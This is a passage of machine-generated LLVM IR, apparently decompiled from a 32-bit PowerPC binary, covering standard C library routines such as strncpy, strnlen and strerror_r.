  %v1_10004ec0 = add i32 %v1_10004ef8, 4
  %v1_10004ecc = add i32 %v2_10004ebc, -16843009
  %v2_10004ed0 = and i32 %v1_10004ecc, -2139062144
  %v5_10004ed0 = icmp eq i32 %v2_10004ed0, 0
  br i1 %v5_10004ed0, label %dec_label_pc_10004ebc, label %dec_label_pc_10004ed8

dec_label_pc_10004ed8:                            ; preds = %dec_label_pc_10004ebc
  %v2_10004ed8 = inttoptr i32 %v1_10004ef8 to i8*
  %v3_10004ed8 = load i8, i8* %v2_10004ed8, align 1
  %v3_10004edc = icmp eq i8 %v3_10004ed8, 0
  br i1 %v3_10004edc, label %dec_label_pc_10004ee4, label %dec_label_pc_10004eec

dec_label_pc_10004ee4:                            ; preds = %dec_label_pc_10004e98, %dec_label_pc_10004ed8
  %v1_10004ee4 = phi i32 [ %v1_10004ef8, %dec_label_pc_10004ed8 ], [ %v0_10004ea4, %dec_label_pc_10004e98 ]
  %v2_10004ee4 = sub i32 %v1_10004ee4, %v0_10004e90
  ret i32 %v2_10004ee4

dec_label_pc_10004eec:                            ; preds = %dec_label_pc_10004ed8
  %v1_10004eec = add i32 %v1_10004ef8, 1
  %v2_10004eec = inttoptr i32 %v1_10004eec to i8*
  %v3_10004eec = load i8, i8* %v2_10004eec, align 1
  %v3_10004ef0 = icmp eq i8 %v3_10004eec, 0
  br i1 %v3_10004ef0, label %dec_label_pc_10004ef8, label %dec_label_pc_10004f04

dec_label_pc_10004ef8:                            ; preds = %dec_label_pc_10004eec
  %v2_10004ef8 = sub i32 %v1_10004ef8, %v0_10004e90
  %v1_10004efc = add i32 %v2_10004ef8, 1
  ret i32 %v1_10004efc

dec_label_pc_10004f04:                            ; preds = %dec_label_pc_10004eec
  %v1_10004f04 = add i32 %v1_10004ef8, 2
  %v2_10004f04 = inttoptr i32 %v1_10004f04 to i8*
  %v3_10004f04 = load i8, i8* %v2_10004f04, align 1
  %v3_10004f08 = icmp eq i8 %v3_10004f04, 0
  br i1 %v3_10004f08, label %dec_label_pc_10004f10, label %dec_label_pc_10004f1c

dec_label_pc_10004f10:                            ; preds = %dec_label_pc_10004f04
  %v2_10004f10 = sub i32 %v1_10004ef8, %v0_10004e90
  %v1_10004f14 = add i32 %v2_10004f10, 2
  ret i32 %v1_10004f14

dec_label_pc_10004f1c:                            ; preds = %dec_label_pc_10004f04
  %v1_10004f1c = add i32 %v1_10004ef8, 3
  %v2_10004f1c = inttoptr i32 %v1_10004f1c to i8*
  %v3_10004f1c = load i8, i8* %v2_10004f1c, align 1
  %v3_10004f20 = icmp eq i8 %v3_10004f1c, 0
  br i1 %v3_10004f20, label %dec_label_pc_10004f28, label %dec_label_pc_10004ebc

dec_label_pc_10004f28:                            ; preds = %dec_label_pc_10004f1c
  %v2_10004f28 = sub i32 %v1_10004ef8, %v0_10004e90
  %v1_10004f2c = add i32 %v2_10004f28, 3
  ret i32 %v1_10004f2c

; uselistorder directives
  uselistorder i32 %v1_10004ec0, { 1, 0 }
  uselistorder i32 %v1_10004ef8, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_10004ea4, { 1, 0, 2 }
  uselistorder i32 %v0_10004e90, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10004ee4, { 1, 0 }
  uselistorder label %dec_label_pc_10004e98, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_10004f34 = icmp eq i32 %arg2, 3
  store i1 %v3_10004f34, i1* %cr7_eq.global-to-local, align 1
  %v1_10004f38 = add i32 %arg1, -1
  store i32 %v1_10004f38, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_10004fb4, label %dec_label_pc_10004f40

dec_label_pc_10004f40:                            ; preds = %entry
  %v1_10004f40 = udiv i32 %arg2, 4
  store i32 %v1_10004f40, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10004f48

dec_label_pc_10004f48:                            ; preds = %dec_label_pc_10004f98, %dec_label_pc_10004f40
  %v2_10004f58 = phi i32 [ %v3_10004f90, %dec_label_pc_10004f98 ], [ %v1_10004f38, %dec_label_pc_10004f40 ]
  %v0_10004f48 = load i32, i32* @r4, align 4
  %v1_10004f48 = inttoptr i32 %v0_10004f48 to i8*
  %v2_10004f48 = load i8, i8* %v1_10004f48, align 1
  %v1_10004f4c = add i32 %v0_10004f48, 1
  store i32 %v1_10004f4c, i32* %r10.global-to-local, align 4
  %v1_10004f50 = add i32 %v0_10004f48, 2
  store i32 %v1_10004f50, i32* %r8.global-to-local, align 4
  %v3_10004f54 = icmp eq i8 %v2_10004f48, 0
  store i1 %v3_10004f54, i1* %cr7_eq.global-to-local, align 1
  %v3_10004f58 = add i32 %v2_10004f58, 1
  %v4_10004f58 = inttoptr i32 %v3_10004f58 to i8*
  store i8 %v2_10004f48, i8* %v4_10004f58, align 1
  store i32 %v3_10004f58, i32* %r11.global-to-local, align 4
  %v0_10004f5c = load i32, i32* %r8.global-to-local, align 4
  %v1_10004f5c = add i32 %v0_10004f5c, 1
  store i32 %v1_10004f5c, i32* %r9.global-to-local, align 4
  %v0_10004f60 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004f60, label %dec_label_pc_10004fa0, label %dec_label_pc_10004f64

dec_label_pc_10004f64:                            ; preds = %dec_label_pc_10004f48
  %v0_10004f64 = load i32, i32* @r4, align 4
  %v1_10004f64 = add i32 %v0_10004f64, 1
  %v2_10004f64 = inttoptr i32 %v1_10004f64 to i8*
  %v3_10004f64 = load i8, i8* %v2_10004f64, align 1
  %v1_10004f68 = add i32 %v0_10004f5c, 2
  store i32 %v1_10004f68, i32* @r4, align 4
  %v3_10004f6c = icmp eq i8 %v3_10004f64, 0
  store i1 %v3_10004f6c, i1* %cr7_eq.global-to-local, align 1
  %v3_10004f70 = add i32 %v2_10004f58, 2
  %v4_10004f70 = inttoptr i32 %v3_10004f70 to i8*
  store i8 %v3_10004f64, i8* %v4_10004f70, align 1
  store i32 %v3_10004f70, i32* %r11.global-to-local, align 4
  %v0_10004f74 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004f74, label %dec_label_pc_10004fa0, label %dec_label_pc_10004f78

dec_label_pc_10004f78:                            ; preds = %dec_label_pc_10004f64
  %v0_10004f78 = load i32, i32* %r10.global-to-local, align 4
  %v1_10004f78 = add i32 %v0_10004f78, 1
  %v2_10004f78 = inttoptr i32 %v1_10004f78 to i8*
  %v3_10004f78 = load i8, i8* %v2_10004f78, align 1
  %v3_10004f7c = icmp eq i8 %v3_10004f78, 0
  store i1 %v3_10004f7c, i1* %cr7_eq.global-to-local, align 1
  %v3_10004f80 = add i32 %v2_10004f58, 3
  %v4_10004f80 = inttoptr i32 %v3_10004f80 to i8*
  store i8 %v3_10004f78, i8* %v4_10004f80, align 1
  store i32 %v3_10004f80, i32* %r11.global-to-local, align 4
  %v0_10004f84 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004f84, label %dec_label_pc_10004fa0, label %dec_label_pc_10004f88

dec_label_pc_10004f88:                            ; preds = %dec_label_pc_10004f78
  %v0_10004f88 = load i32, i32* %r8.global-to-local, align 4
  %v1_10004f88 = add i32 %v0_10004f88, 1
  %v2_10004f88 = inttoptr i32 %v1_10004f88 to i8*
  %v3_10004f88 = load i8, i8* %v2_10004f88, align 1
  %v3_10004f8c = icmp eq i8 %v3_10004f88, 0
  store i1 %v3_10004f8c, i1* %cr7_eq.global-to-local, align 1
  %v3_10004f90 = add i32 %v2_10004f58, 4
  %v4_10004f90 = inttoptr i32 %v3_10004f90 to i8*
  store i8 %v3_10004f88, i8* %v4_10004f90, align 1
  store i32 %v3_10004f90, i32* %r11.global-to-local, align 4
  %v0_10004f94 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004f94, label %dec_label_pc_10004fa0, label %dec_label_pc_10004f98

dec_label_pc_10004f98:                            ; preds = %dec_label_pc_10004f88
  %v0_10004f98 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004f98 = add i32 %v0_10004f98, -1
  store i32 %v1_10004f98, i32* %ctr.global-to-local, align 4
  %v2_10004f98 = icmp eq i32 %v1_10004f98, 0
  br i1 %v2_10004f98, label %dec_label_pc_10004fb4, label %dec_label_pc_10004f48

dec_label_pc_10004fa0:                            ; preds = %dec_label_pc_10004f88, %dec_label_pc_10004f78, %dec_label_pc_10004f64, %dec_label_pc_10004f48
  %v1_10004fa0 = phi i32 [ %v3_10004f90, %dec_label_pc_10004f88 ], [ %v3_10004f80, %dec_label_pc_10004f78 ], [ %v3_10004f70, %dec_label_pc_10004f64 ], [ %v3_10004f58, %dec_label_pc_10004f48 ]
  %v2_10004fa011 = sub i32 %arg1, %v1_10004fa0
  %v2_10004fa4 = add i32 %v2_10004fa011, %arg2
  %v1_10004fa8 = add i32 %v2_10004fa4, -1
  store i32 %v1_10004fa8, i32* %r9.global-to-local, align 4
  %v4_10004fa8 = icmp eq i32 %v1_10004fa8, 0
  %v0_10004fac = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10004fa8, i32 %v0_10004fac)
  %v2_10004fe4.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10004fdc

dec_label_pc_10004fb4:                            ; preds = %dec_label_pc_10004f98, %entry
  %v1_10004fb4 = urem i32 %arg2, 4
  store i32 %v1_10004fb4, i32* %r9.global-to-local, align 4
  %v3_10004fb4 = icmp eq i32 %v1_10004fb4, 0
  %v0_10004fb8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10004fb4, i32 %v0_10004fb8)
  store i32 %v1_10004fb4, i32* %ctr.global-to-local, align 4
  %v2_10004fd0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10004fc0

dec_label_pc_10004fc0:                            ; preds = %dec_label_pc_10004fd8.dec_label_pc_10004fc0_crit_edge, %dec_label_pc_10004fb4
  %v2_10004fd0 = phi i32 [ %v3_10004fd0, %dec_label_pc_10004fd8.dec_label_pc_10004fc0_crit_edge ], [ %v2_10004fd0.pre, %dec_label_pc_10004fb4 ]
  %v0_10004fc4 = phi i32 [ %v0_10004fc4.pre, %dec_label_pc_10004fd8.dec_label_pc_10004fc0_crit_edge ], [ %v1_10004fb4, %dec_label_pc_10004fb4 ]
  %v0_10004fc0 = load i32, i32* @r4, align 4
  %v1_10004fc0 = inttoptr i32 %v0_10004fc0 to i8*
  %v2_10004fc0 = load i8, i8* %v1_10004fc0, align 1
  %v1_10004fc4 = add i32 %v0_10004fc4, -1
  store i32 %v1_10004fc4, i32* %r9.global-to-local, align 4
  %v1_10004fc8 = add i32 %v0_10004fc0, 1
  store i32 %v1_10004fc8, i32* @r4, align 4
  %v3_10004fcc = icmp eq i8 %v2_10004fc0, 0
  store i1 %v3_10004fcc, i1* %cr7_eq.global-to-local, align 1
  %v3_10004fd0 = add i32 %v2_10004fd0, 1
  %v4_10004fd0 = inttoptr i32 %v3_10004fd0 to i8*
  store i8 %v2_10004fc0, i8* %v4_10004fd0, align 1
  store i32 %v3_10004fd0, i32* %r11.global-to-local, align 4
  %v0_10004fd4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004fd4 = add i32 %v0_10004fd4, -1
  store i32 %v1_10004fd4, i32* %ctr.global-to-local, align 4
  %v2_10004fd4 = icmp eq i32 %v1_10004fd4, 0
  br i1 %v2_10004fd4, label %dec_label_pc_10004fec, label %dec_label_pc_10004fd8

dec_label_pc_10004fd8:                            ; preds = %dec_label_pc_10004fc0
  %v0_10004fd8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004fd8, label %dec_label_pc_10004fdc, label %dec_label_pc_10004fd8.dec_label_pc_10004fc0_crit_edge

dec_label_pc_10004fd8.dec_label_pc_10004fc0_crit_edge: ; preds = %dec_label_pc_10004fd8
  %v0_10004fc4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10004fc0

dec_label_pc_10004fdc:                            ; preds = %dec_label_pc_10004fd8, %dec_label_pc_10004fa0
  %v2_10004fe4.pre = phi i32 [ %v2_10004fe4.pre.pre, %dec_label_pc_10004fa0 ], [ %v3_10004fd0, %dec_label_pc_10004fd8 ]
  %v0_10004fdc = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_10004fdc, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10004fe0

dec_label_pc_10004fe0:                            ; preds = %dec_label_pc_10004fe0, %dec_label_pc_10004fdc
  %v2_10004fe4 = phi i32 [ %v3_10004fe4, %dec_label_pc_10004fe0 ], [ %v2_10004fe4.pre, %dec_label_pc_10004fdc ]
  %v3_10004fe4 = add i32 %v2_10004fe4, 1
  %v4_10004fe4 = inttoptr i32 %v3_10004fe4 to i8*
  store i8 0, i8* %v4_10004fe4, align 1
  store i32 %v3_10004fe4, i32* %r11.global-to-local, align 4
  %v0_10004fe8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004fe8 = add i32 %v0_10004fe8, -1
  store i32 %v1_10004fe8, i32* %ctr.global-to-local, align 4
  %v2_10004fe8 = icmp eq i32 %v1_10004fe8, 0
  br i1 %v2_10004fe8, label %dec_label_pc_10004fec, label %dec_label_pc_10004fe0

dec_label_pc_10004fec:                            ; preds = %dec_label_pc_10004fc0, %dec_label_pc_10004fe0
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10004fe8, { 1, 0 }
  uselistorder i32 %v3_10004fe4, { 1, 2, 0 }
  uselistorder i32 %v1_10004fd4, { 1, 0 }
  uselistorder i32 %v3_10004fd0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10004fb4, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10004f98, { 1, 0 }
  uselistorder i32 %v3_10004f90, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004fec, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10004ff0 = load i32, i32* @r4, align 4
  %v3_10004ff0 = icmp eq i32 %v0_10004ff0, 0
  %v0_10004ffc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10004ff0, i32 %v0_10004ffc)
  %v1_1000500c = load i32, i32* @r4, align 4
  %v2_1000500c = add i32 %v1_1000500c, %tmp
  %v3_10005010 = icmp ugt i32 %v2_1000500c, %tmp
  %v4_10005010 = icmp eq i32 %v1_1000500c, 0
  %v2_10005014 = or i1 %v4_10005010, %v3_10005010
  br i1 %v2_10005014, label %dec_label_pc_1000501c, label %dec_label_pc_10005018

dec_label_pc_10005004:                            ; preds = %dec_label_pc_10005084
  br label %dec_label_pc_100050c8

dec_label_pc_10005018:                            ; preds = %entry
  br label %dec_label_pc_1000501c

dec_label_pc_1000501c:                            ; preds = %entry, %dec_label_pc_10005018
  %v0_100050cc = phi i32 [ %v2_1000500c, %entry ], [ -1, %dec_label_pc_10005018 ]
  %v1_1000504c6 = urem i32 %tmp, 4
  %v3_1000504c8 = icmp eq i32 %v1_1000504c6, 0
  br i1 %v3_1000504c8, label %dec_label_pc_10005054, label %dec_label_pc_10005024

dec_label_pc_10005024:                            ; preds = %dec_label_pc_1000501c, %dec_label_pc_10005048
  %v0_1000503c = phi i32 [ %v1_10005048, %dec_label_pc_10005048 ], [ %tmp, %dec_label_pc_1000501c ]
  %v1_10005024 = inttoptr i32 %v0_1000503c to i8*
  %v2_10005024 = load i8, i8* %v1_10005024, align 1
  %v3_10005028 = icmp eq i8 %v2_10005024, 0
  br i1 %v3_10005028, label %dec_label_pc_10005030, label %dec_label_pc_10005048

dec_label_pc_10005030:                            ; preds = %dec_label_pc_10005024
  %v3_10005030 = icmp ugt i32 %v0_100050cc, %v0_1000503c
  %v0_1000503c.v0_100050cc = select i1 %v3_10005030, i32 %v0_1000503c, i32 %v0_100050cc
  %v2_10005040 = sub i32 %v0_1000503c.v0_100050cc, %tmp
  ret i32 %v2_10005040

dec_label_pc_10005048:                            ; preds = %dec_label_pc_10005024
  %v1_10005048 = add i32 %v0_1000503c, 1
  %v1_1000504c = urem i32 %v1_10005048, 4
  %v3_1000504c = icmp eq i32 %v1_1000504c, 0
  br i1 %v3_1000504c, label %dec_label_pc_10005054, label %dec_label_pc_10005024

dec_label_pc_10005054:                            ; preds = %dec_label_pc_10005048, %dec_label_pc_1000501c
  %v0_10005058 = phi i32 [ %tmp, %dec_label_pc_1000501c ], [ %v1_10005048, %dec_label_pc_10005048 ]
  store i32 -2139062144, i32* @r7, align 4
  %v2_100050c03 = icmp ult i32 %v0_10005058, %v0_100050cc
  br i1 %v2_100050c03, label %dec_label_pc_10005064, label %dec_label_pc_100050c8

dec_label_pc_10005064:                            ; preds = %dec_label_pc_10005054, %dec_label_pc_100050bc
  %v0_10005004 = phi i32 [ %v1_10005068, %dec_label_pc_100050bc ], [ %v0_10005058, %dec_label_pc_10005054 ]
  %v1_10005064 = inttoptr i32 %v0_10005004 to i32*
  %v2_10005064 = load i32, i32* %v1_10005064, align 4
  %v1_10005068 = add i32 %v0_10005004, 4
  %v1_10005074 = add i32 %v2_10005064, -16843009
  %v2_10005078 = and i32 %v1_10005074, -2139062144
  %v5_10005078 = icmp eq i32 %v2_10005078, 0
  %v1_1000507c = add i32 %v0_10005004, 1
  br i1 %v5_10005078, label %dec_label_pc_100050bc, label %dec_label_pc_10005084

dec_label_pc_10005084:                            ; preds = %dec_label_pc_10005064
  %v2_10005084 = inttoptr i32 %v0_10005004 to i8*
  %v3_10005084 = load i8, i8* %v2_10005084, align 1
  %v3_10005088 = icmp eq i8 %v3_10005084, 0
  br i1 %v3_10005088, label %dec_label_pc_10005004, label %dec_label_pc_10005090

dec_label_pc_10005090:                            ; preds = %dec_label_pc_10005084
  %v2_10005090 = inttoptr i32 %v1_1000507c to i8*
  %v3_10005090 = load i8, i8* %v2_10005090, align 1
  %v3_10005094 = icmp eq i8 %v3_10005090, 0
  br i1 %v3_10005094, label %dec_label_pc_100050c8, label %dec_label_pc_1000509c

dec_label_pc_1000509c:                            ; preds = %dec_label_pc_10005090
  %v1_1000509c = add i32 %v0_10005004, 2
  %v2_1000509c = inttoptr i32 %v1_1000509c to i8*
  %v3_1000509c = load i8, i8* %v2_1000509c, align 1
  %v3_100050a4 = icmp eq i8 %v3_1000509c, 0
  br i1 %v3_100050a4, label %dec_label_pc_100050c8, label %dec_label_pc_100050ac

dec_label_pc_100050ac:                            ; preds = %dec_label_pc_1000509c
  %v1_100050ac = add i32 %v0_10005004, 3
  %v2_100050ac = inttoptr i32 %v1_100050ac to i8*
  %v3_100050ac = load i8, i8* %v2_100050ac, align 1
  %v3_100050b4 = icmp eq i8 %v3_100050ac, 0
  br i1 %v3_100050b4, label %dec_label_pc_100050c8, label %dec_label_pc_100050bc

dec_label_pc_100050bc:                            ; preds = %dec_label_pc_100050ac, %dec_label_pc_10005064
  %v2_100050c0 = icmp ult i32 %v1_10005068, %v0_100050cc
  br i1 %v2_100050c0, label %dec_label_pc_10005064, label %dec_label_pc_100050c8

dec_label_pc_100050c8:                            ; preds = %dec_label_pc_100050bc, %dec_label_pc_10005090, %dec_label_pc_1000509c, %dec_label_pc_100050ac, %dec_label_pc_10005054, %dec_label_pc_10005004
  %v0_100050d4 = phi i32 [ %v0_10005004, %dec_label_pc_10005004 ], [ %v0_10005058, %dec_label_pc_10005054 ], [ %v1_100050ac, %dec_label_pc_100050ac ], [ %v1_1000509c, %dec_label_pc_1000509c ], [ %v1_1000507c, %dec_label_pc_10005090 ], [ %v0_100050cc, %dec_label_pc_100050bc ]
  %v3_100050c8 = icmp ugt i32 %v0_100050cc, %v0_100050d4
  %v0_100050d4.v0_100050cc = select i1 %v3_100050c8, i32 %v0_100050d4, i32 %v0_100050cc
  %v2_100050d8 = sub i32 %v0_100050d4.v0_100050cc, %tmp
  ret i32 %v2_100050d8

; uselistorder directives
  uselistorder i32 %v1_10005068, { 1, 0 }
  uselistorder i32 %v0_10005004, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v0_10005058, { 1, 0, 2 }
  uselistorder i32 %v1_10005048, { 1, 0, 2 }
  uselistorder i32 %v0_1000503c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_100050cc, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_1000500c, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100050c8, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_10005064, { 1, 0 }
  uselistorder label %dec_label_pc_10005024, { 1, 0 }
  uselistorder label %dec_label_pc_1000501c, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268456184, i32* @lr, align 4
  %v0_100050f4 = call i32 @__xpg_strerror_r()
  %v0_100050fc = load i32, i32* @r29, align 4
  ret i32 %v0_100050fc
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_10005110 = load i32, i32* @r3, align 4
  %v2_10005110 = icmp ugt i32 %v0_10005110, 124
  %v0_10005120 = load i32, i32* @r4, align 4
  store i32 %v0_10005120, i32* %r27.global-to-local, align 4
  %v0_10005128 = load i32, i32* @r5, align 4
  br i1 %v2_10005110, label %dec_label_pc_1000516c, label %dec_label_pc_10005130

dec_label_pc_10005130:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1000bd78.378 to i32), i32* %r30.global-to-local, align 4
  %v3_1000514c7 = icmp eq i32 %v0_10005110, 0
  br i1 %v3_1000514c7, label %dec_label_pc_10005160, label %dec_label_pc_10005140

dec_label_pc_10005140:                            ; preds = %dec_label_pc_10005130, %dec_label_pc_10005140
  %v0_10005144 = phi i32 [ %v1_10005144, %dec_label_pc_10005140 ], [ ptrtoint ([8 x i8]* @global_var_1000bd78.378 to i32), %dec_label_pc_10005130 ]
  %v1_10005144 = add i32 %v0_10005144, 1
  store i32 %v1_10005144, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005140

dec_label_pc_10005160:                            ; preds = %dec_label_pc_10005130
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100051a0

dec_label_pc_1000516c:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_10005110, 0
  %v1_10005170 = zext i1 %tmp to i32
  %v2_10005170 = ashr i32 %v0_10005110, 31
  %v3_10005170 = and i32 %v2_10005170, -2
  %v4_10005170 = or i32 %v3_10005170, %v1_10005170
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_10005184 = bitcast i32* %stack_var_-39 to i8*
  %v6_10005184 = call i32 @_uintmaxtostr(i8* %v5_10005184, i32 %v4_10005170, i32 %v0_10005110, i32 -10, i32 0)
  %v1_1000518c = add i32 %v6_10005184, -14
  store i32 %v1_1000518c, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1000bd68.379 to i32), i32* @r4, align 4
  store i32 %v1_1000518c, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268456352, i32* @lr, align 4
  %v0_1000519c = call i32 @memcpy()
  %v0_100051a0.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_100051a4.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_100051b4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100051a0

dec_label_pc_100051a0:                            ; preds = %dec_label_pc_10005160, %dec_label_pc_1000516c
  %v0_100051b4 = phi i32 [ %v0_10005128, %dec_label_pc_10005160 ], [ %v0_100051b4.pre, %dec_label_pc_1000516c ]
  %v0_100051a4 = phi i32 [ ptrtoint ([8 x i8]* @global_var_1000bd78.378 to i32), %dec_label_pc_10005160 ], [ %v0_100051a4.pre, %dec_label_pc_1000516c ]
  %v1_100051a8 = phi i32 [ %v0_10005120, %dec_label_pc_10005160 ], [ %v0_100051a0.pre, %dec_label_pc_1000516c ]
  %tmp19 = icmp slt i32 %v1_100051a8, 0
  %v1_100051a0 = zext i1 %tmp19 to i32
  %v2_100051a0 = ashr i32 %v1_100051a8, 31
  %v3_100051a0 = and i32 %v2_100051a0, -2
  %v4_100051a0 = or i32 %v3_100051a0, %v1_100051a0
  store i32 %v0_100051a4, i32* @r3, align 4
  %v2_100051a8 = xor i32 %v4_100051a0, %v1_100051a8
  %v2_100051ac = sub i32 %v4_100051a0, %v2_100051a8
  %tmp20 = icmp slt i32 %v2_100051ac, 0
  %v1_100051b0 = zext i1 %tmp20 to i32
  %v2_100051b0 = ashr i32 %v2_100051ac, 31
  %v3_100051b0 = and i32 %v2_100051b0, -2
  %v4_100051b0 = or i32 %v3_100051b0, %v1_100051b0
  %v2_100051b4 = and i32 %v4_100051b0, %v0_100051b4
  store i32 %v2_100051b4, i32* @r29, align 4
  %v0_100051b8 = call i32 @__GI_strlen()
  %v1_100051bc = add i32 %v0_100051b8, 1
  store i32 %v1_100051bc, i32* %r31.global-to-local, align 4
  %v1_100051c0 = load i32, i32* @r29, align 4
  %v3_100051c0 = icmp ugt i32 %v1_100051bc, %v1_100051c0
  br i1 %v3_100051c0, label %dec_label_pc_100051c8, label %dec_label_pc_100051d0

dec_label_pc_100051c8:                            ; preds = %dec_label_pc_100051a0
  store i32 %v1_100051c0, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100051d0

dec_label_pc_100051d0:                            ; preds = %dec_label_pc_100051a0, %dec_label_pc_100051c8
  %v0_100051e0 = phi i32 [ %v1_100051c0, %dec_label_pc_100051c8 ], [ %v1_100051bc, %dec_label_pc_100051a0 ]
  %v3_100051d0 = icmp eq i32 %v0_100051e0, 0
  br i1 %v3_100051d0, label %dec_label_pc_100051f4, label %dec_label_pc_100051d8

dec_label_pc_100051d8:                            ; preds = %dec_label_pc_100051d0
  %v0_100051d8 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100051d8, i32* @r4, align 4
  %v0_100051dc = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100051dc, i32* @r3, align 4
  store i32 %v0_100051e0, i32* @r5, align 4
  store i32 268456424, i32* @lr, align 4
  %v0_100051e4 = call i32 @memcpy()
  %v1_100051e8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100051e8 = add i32 %v1_100051e8, %v0_100051dc
  %v3_100051f0 = add i32 %v2_100051e8, -1
  %v4_100051f0 = inttoptr i32 %v3_100051f0 to i8*
  store i8 0, i8* %v4_100051f0, align 1
  br label %dec_label_pc_100051f4

dec_label_pc_100051f4:                            ; preds = %dec_label_pc_100051d0, %dec_label_pc_100051d8
  %v0_100051f4 = load i32, i32* %r28.global-to-local, align 4
  %v3_100051f4 = icmp eq i32 %v0_100051f4, 0
  br i1 %v3_100051f4, label %dec_label_pc_10005204, label %dec_label_pc_100051fc

dec_label_pc_100051fc:                            ; preds = %dec_label_pc_100051f4
  %v0_100051fc = call i32 @__errno_location()
  %v0_10005200 = load i32, i32* %r28.global-to-local, align 4
  %v2_10005200 = inttoptr i32 %v0_100051fc to i32*
  store i32 %v0_10005200, i32* %v2_10005200, align 4
  %v0_10005208.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10005204

dec_label_pc_10005204:                            ; preds = %dec_label_pc_100051f4, %dec_label_pc_100051fc
  %v0_10005208 = phi i32 [ 0, %dec_label_pc_100051f4 ], [ %v0_10005208.pre, %dec_label_pc_100051fc ]
  ret i32 %v0_10005208

; uselistorder directives
  uselistorder i32 %v2_100051ac, { 1, 0 }
  uselistorder i32 %v4_100051a0, { 1, 0 }
  uselistorder i32 %v1_100051a8, { 1, 2, 0 }
  uselistorder i32 %v1_10005144, { 1, 0 }
  uselistorder i32 %v0_10005110, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 1, 0 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1000bd78.378 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_10005204, { 1, 0 }
  uselistorder label %dec_label_pc_100051f4, { 1, 0 }
  uselistorder label %dec_label_pc_100051d0, { 1, 0 }
  uselistorder label %dec_label_pc_100051a0, { 1, 0 }
  uselistorder label %dec_label_pc_10005140, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
